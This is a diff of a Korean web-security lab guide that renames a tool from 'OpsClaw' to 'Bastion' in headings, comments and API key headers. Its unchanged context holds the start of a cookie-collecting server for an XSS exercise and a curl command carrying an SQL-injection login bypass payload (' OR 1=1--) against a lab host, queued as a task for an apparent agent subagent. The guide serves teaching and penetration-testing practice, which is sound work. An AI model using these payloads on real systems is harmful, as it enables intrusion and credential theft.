@@ -469,7 +469,7 @@ curl -s -X POST http://10.20.30.80:3000/api/Feedbacks \
 > **배우는 것**: XSS 공격의 실제 피해와 방어 필요성
 
 ```bash
-# 간이 쿠키 수집 서버 설정 (opsclaw에서)
+# 간이 쿠키 수집 서버 설정 (bastion에서)
 python3 -c "
 from http.server import HTTPServer, BaseHTTPRequestHandler
 import urllib.parse
@@ -558,25 +558,25 @@ echo "[완료] 공격 체인 시뮬레이션 종료"
 > - Phase 3: UNION SELECT로 비밀번호 해시까지 추출
 > - 이것이 현실 공격의 전형적인 패턴: 취약점 1개 → 연쇄 공격 → 대규모 피해
 
-### Step 2: OpsClaw를 활용한 웹 공격 증적 기록
+### Step 2: Bastion를 활용한 웹 공격 증적 기록
 
-> **실습 목적**: 웹 공격 과정을 OpsClaw로 체계적으로 기록한다.
+> **실습 목적**: 웹 공격 과정을 Bastion로 체계적으로 기록한다.
 >
 > **배우는 것**: 모의해킹 증적 관리의 중요성
 
 ```bash
 RESULT=$(curl -s -X POST http://localhost:8000/projects \
   -H "Content-Type: application/json" \
-  -H "X-API-Key: opsclaw-api-key-2026" \
+  -H "X-API-Key: bastion-api-key-2026" \
   -d '{"name":"week03-web-attack","request_text":"웹 공격 실습 (SQLi, XSS)","master_mode":"external"}')
 PID=$(echo $RESULT | python3 -c "import sys,json; print(json.load(sys.stdin)['project']['id'])")
 
-curl -s -X POST "http://localhost:8000/projects/$PID/plan" -H "X-API-Key: opsclaw-api-key-2026" > /dev/null
-curl -s -X POST "http://localhost:8000/projects/$PID/execute" -H "X-API-Key: opsclaw-api-key-2026" > /dev/null
+curl -s -X POST "http://localhost:8000/projects/$PID/plan" -H "X-API-Key: bastion-api-key-2026" > /dev/null
+curl -s -X POST "http://localhost:8000/projects/$PID/execute" -H "X-API-Key: bastion-api-key-2026" > /dev/null
 
 curl -s -X POST "http://localhost:8000/projects/$PID/execute-plan" \
   -H "Content-Type: application/json" \
-  -H "X-API-Key: opsclaw-api-key-2026" \
+  -H "X-API-Key: bastion-api-key-2026" \
   -d '{
     "tasks": [
       {"order":1,"title":"SQLi 인증우회","instruction_prompt":"curl -s -X POST http://10.20.30.80:3000/rest/user/login -H \"Content-Type: application/json\" -d \"{\\\"email\\\":\\\"\\u0027 OR 1=1--\\\",\\\"password\\\":\\\"x\\\"}\" | head -5","risk_level":"medium","subagent_url":"http://localhost:8002"},
